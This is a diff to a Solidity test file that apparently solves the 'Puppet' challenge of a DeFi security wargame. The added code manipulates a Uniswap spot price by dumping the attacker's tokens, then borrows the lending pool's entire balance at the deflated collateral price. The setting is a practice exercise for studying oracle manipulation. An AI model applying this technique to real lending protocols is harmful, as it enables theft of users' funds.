@@ -100,7 +100,27 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        // just give 5 minutes of deadline for the tx. (it's a local evm so it doesn't matter how long)
+        uint256 deadline = block.timestamp + 300;
+        vm.startPrank(attacker);
 
+        // approve the max amount to move freely
+        dvt.approve(address(uniswapExchange), type(uint256).max);
+
+        // calculate the MIN amount of eth needed to trade
+        uint256 expectedETH =
+            calculateTokenToEthInputPrice(1000, UNISWAP_INITIAL_TOKEN_RESERVE + 1000, UNISWAP_INITIAL_ETH_RESERVE);
+        // send all of the attacker's DVT balance to the exchange
+        // ask for the calculated amount of ETH
+        // add the transaction deadline
+        // enjoy being a whale
+        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), expectedETH, deadline);
+        // drain all the pool with the manipulated prices
+        // get the minimum amount of ETH again
+        uint256 poolBalance = dvt.balanceOf(address(puppetPool));
+        puppetPool.borrow{value: puppetPool.calculateDepositRequired(poolBalance)}(poolBalance);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
